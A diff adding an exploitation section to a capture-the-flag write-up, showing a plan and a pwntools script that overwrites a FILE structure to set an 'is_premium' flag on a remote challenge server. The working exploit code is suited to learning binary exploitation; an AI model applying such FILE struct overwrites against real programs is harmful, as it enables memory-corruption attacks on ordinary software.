@@ -197,4 +197,34 @@ We then have the following code:
 ```
 This allow us to overwrite a FILE struct, but unlike option 1, it then uses fwrite insteadof fread. it also requires `obj.is_premium` to be set to 1
 
+## 2. exploitation
+
+We have the following plan: 
+
+<ol>
+<li>Use the first FILE overwrite to set obj.is_premium to 1</li>
+<li>Read the flag to memory</li>
+<li>Use a second FILE overwrite to leak the flag</li>
+</ol>
+
+### 2.1 First FILE overwrite
+The obj.is_premium variable is stored at the address 0x404040, which means the we can trigger an overwrite of the veriable using the following code:
+```python
+from pwn import *
+context.arch = 'amd64'
+#target = process('challenge')
+target = remote('challenges.unitedctf.ca',33078)
+elf = ELF('challenge')
+file = FileStructure(null=elf.symbols['is_premium']-0x10)
+payload = file.read(addr=elf.symbols['is_premium'],size=8)
+print(target.recvuntil(b'>'))
+target.sendline(b'1')
+print(target.recvuntil(b':'))
+print(file)
+target.send(payload)
+```
+This will set the FILE structure file decsriptor to 0 (standard input) and the 
+beginning of the FILE, and will set its pointers so that its cache buffer points to `obj.is_premium`. [this website](https://pwn.college/software-exploitation/file-struct-exploits/) has very good explanations on how FILE works and how to leverage this kind of primitives.
+
+
 
